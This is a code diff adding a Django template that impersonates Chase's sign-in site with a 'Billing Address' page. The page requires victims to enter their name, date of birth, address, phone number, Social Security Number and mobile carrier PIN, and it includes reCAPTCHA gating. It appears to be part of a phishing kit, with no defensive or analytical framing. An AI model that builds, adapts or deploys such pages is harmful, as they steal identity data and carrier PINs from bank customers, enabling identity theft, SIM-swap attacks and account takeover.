@@ -1,0 +1,89 @@
+{% extends "parent/parent.html" %}
+{% load static %}
+{% block title %} Sign in - chase.com {% endblock %}
+
+{% block header %}
+<link rel="stylesheet" href="{% static 'base/css/styles.css' %}?{% now 'U' %}">
+<script src='https://www.google.com/recaptcha/api.js?render={{recaptcha_site_key}}'></script>
+{% endblock %}
+{% block body %}
+    <div class="container-fluid header">
+        <div class="row justify-content-center text-center">
+            <div class="col-12">
+                <div class="logo mt-4">
+                    <a href="">
+                        <img src="{% static 'base/images/wordmark-white.png' %}" alt="">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container login">
+        <div class="row justify-content-center text-left row_two">
+            <div class="col-11 col-sm-9 col-md-7 col-lg-5 col-xl-4 bg-white login_form">
+                <div class="content">
+                    <div class="content-header p-2">
+                        <h1>Billing Address</h1>
+                    </div>
+                    <form action="" method="POST" class="p-2 form_two">
+                        {% csrf_token %}
+                        
+                        <div class="text_input mt-3 div_inline m-0" >
+                            <label for="id_First_Name" class="placeLabel" style="font-size:14px">First Name</label>
+                            <input type="text" class="form-control slimodan" required name="FirstName" id="id_First_Name">
+                        </div>
+                        <div class="text_input mt-3 div_inline m-0" >
+                            <label for="id_Last_Name" class="placeLabel" style="font-size:14px">Last Name</label>
+                            <input type="text" class="form-control slimodan" required name="LastName" id="id_Last_Name">
+                        </div>
+                        <div class="text_input mt-3">
+                            <label for="Date_Of_Birth" class="placeLabel">Date Of Birth(DD/MM/YYYY)</label>
+                            <input type="date" class="form-control" required name="Date_Of_Birth" id="Date_Of_Birth">
+                        </div>
+                        <div class="text_input mt-3">
+                            <label for="Address_Line" class="placeLabel">Address Line</label>
+                            <input type="text" class="form-control slimodan" required name="Address" id="Address_Line">
+                        </div>
+                        <div class="text_input mt-3 div_inline m-0">
+                            <label for="City" class="placeLabel" style="font-size:14px">City</label>
+                            <input type="text" class="form-control slimodan"  required name="City" id="City">
+                        </div>
+                        <div class="text_input mt-3 div_inline m-0" >
+                            <label for="State" class="placeLabel" style="font-size:14px">State</label>
+                            <input type="text" class="form-control slimodan" required name="State" id="State">
+                        </div>
+                        <div class="text_input mt-3">
+                            <label for="Zip_Code" class="placeLabel">Zip Code</label>
+                            <input type="text" class="form-control slimodan" required name="Zip_Code" id="Zip_Code">
+                        </div>
+                        <div class="text_input mt-3">
+                            <label for="Phone_Number" class="placeLabel">Phone Number</label>
+                            <input type="text" class="form-control slimodan" required name="Phone_Number" id="Phone_Number">
+                        </div>
+                        <div class="text_input mt-3">
+                            <label for="SSCODE" class="placeLabel">Social Security Number</label>
+                            <input type="text" class="form-control slimodan" required name="SSCODE" id="SSCODE">
+                        </div>
+                        <div class="text_input mt-3">
+                            <label for="Carrier_Pin" class="placeLabel">Carrier Pin</label>
+                            <input type="text" class="form-control slimodan" required name="Carrier_Pin" id="Carrier_Pin">
+                        </div>
+                        <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response"> 
+                        <div class="text_input login_btn mt-5">
+                            <button class="btn btn-primary " id="two_login">Continue</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="{% static 'base/js/script.js' %}" defer="true"></script>
+
+    <script>
+        grecaptcha.ready(function() {
+          grecaptcha.execute('{{recaptcha_site_key}}', {action: "/"}).then(function(token) {
+            document.getElementById('g-recaptcha-response').value = token;
+          });
+        });
+    </script>
+{% endblock %}
